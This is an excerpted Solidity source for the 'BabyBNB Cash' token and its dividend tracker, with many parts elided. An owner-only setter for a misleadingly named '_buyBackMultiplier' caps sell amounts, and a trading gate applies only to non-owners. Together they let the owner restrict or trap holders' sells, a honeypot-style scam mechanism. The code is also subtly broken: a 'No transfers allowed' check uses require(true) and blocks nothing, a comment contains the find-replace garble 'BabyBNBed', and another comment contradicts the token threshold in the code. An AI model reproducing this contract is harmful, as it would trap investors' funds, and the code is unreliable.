...
library SafeMath {
    ...
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        ...
        // benefit is lost if 'b' is also BabyBNBed.
...
// File: contracts/BabyBNBDividendPayingToken.sol
...
contract BabyBNB is ERC20, Ownable {
	...
	address payable public MarketingWallet = payable(0x9A5e22c3cc1f1168867d1f26379282C15657bb0c); // Marketing Address

    bool private swapping;

    BabyBNBDividendTracker public dividendTracker;

    address public liquidityWallet;

    uint256 private _buyBackMultiplier = 300 * (10**18); 
    ...
    constructor() ERC20("BabyBNB Cash", "BabyBNB") {
        ...
        dividendTracker = new BabyBNBDividendTracker();
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "BabyBNB: The dividend tracker already has that address");

        BabyBNBDividendTracker newDividendTracker = BabyBNBDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "BabyBNB: The new dividend tracker must be owned by the BabyBNB token contract");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "BabyBNB: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != PancakeSwapV2Pair, "BabyBNB: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "BabyBNB: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "BabyBNB: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "BabyBNB: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "BabyBNB: Cannot update gasForProcessing to same value");
	...
	function SetbuyBackMultiplier(uint256 buyBackMultiplier) external onlyOwner() {
        _buyBackMultiplier = buyBackMultiplier;
    }
    ...
    function _transfer(
       ...
       if(from != owner()){
        ...
        if(!tradingOpen) {
            require(canTransferBeforetradingOpen[from], "BabyBNB: This account cannot send tokens until trading is enabled");
        }
        ...
        if( 
            ...
            require(amount <= _buyBackMultiplier, "Sell transfer amount exceeds the buyBackMultiplier.");
        }
...
contract BabyBNBDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() public DividendPayingToken("BabyBNB_Dividend_Tracker", "BabyBNB_Dividend_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) internal override {
        require(true, "BabyBNB_Dividend_Tracker: No transfers allowed");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1 && newClaimWait <= 86400, "BabyBNB_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "BabyBNB_Dividend_Tracker: Cannot update claimWait to same value");
